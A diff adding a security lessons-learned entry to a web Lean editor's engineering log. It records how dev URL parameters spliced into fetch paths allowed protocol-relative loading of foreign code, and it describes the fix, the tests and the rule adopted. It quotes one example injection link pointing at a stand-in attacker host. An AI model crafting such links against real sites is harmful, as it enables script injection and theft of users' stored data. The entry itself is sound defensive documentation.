@@ -378,3 +378,17 @@ Gates: `tests/unit/lean4monaco-fixes.test.ts` runs against the installed files, 
 
 Rules: when a library splits one protocol across two contexts, fix both halves in one change and test the round trip, not either half alone. And a dev-only loader chain needs a test that runs the real chain: unit tests of the patch function passed while the dev server served the unpatched module.
 
+
+### 57. A URL parameter spliced into a fetch path chooses the origin
+
+Found while drafting the embedding contract (docs/EMBEDDING.md §4). The dev overrides `?snapshots=<dir>`, `?profiles=<dir>` and `?runtime=<buildId>` were read from `location.search` and spliced into artifact URLs as `/${dir}/…`. A value starting with `/` makes that `//host/…`, which is protocol-relative. So `?snapshots=/attacker.example/x` booted an environment baked by someone else, and Lean widget modules in it run their JS in the InfoView iframe, which is same-origin with the page and its storage (the editor buffer, OPFS). Every QED64 link was a script-injection link.
+
+Fix (`frontend/src/embed/params.ts`): one parser validates all three before any fetch.
+- A directory is one plain segment, optionally under its own promoted name (`snapshots/widgets8`, `snapshots-0031`, `profiles-staged`), and must resolve on this origin.
+- A runtime is `wasm64-<16 hex>`.
+- A refused value fails the boot with a message naming the parameter, never a silent fallback to the served set.
+- `installArtifacts(ui, {overrides})` lets a library embedder pass `"none"` (ignore the URL) or its own values, validated by the same rules.
+
+Gate: `tests/unit/boot-params.test.ts` covers the accepted spellings, protocol-relative, absolute, percent-encoded, backslash and traversal values, and asserts a refusal sends no request.
+
+Rule: any URL parameter that reaches a `fetch`, `importScripts` or `Worker` URL is an origin decision. Validate it as a path segment against an allowlist pattern before use, and fail loudly rather than fall back.
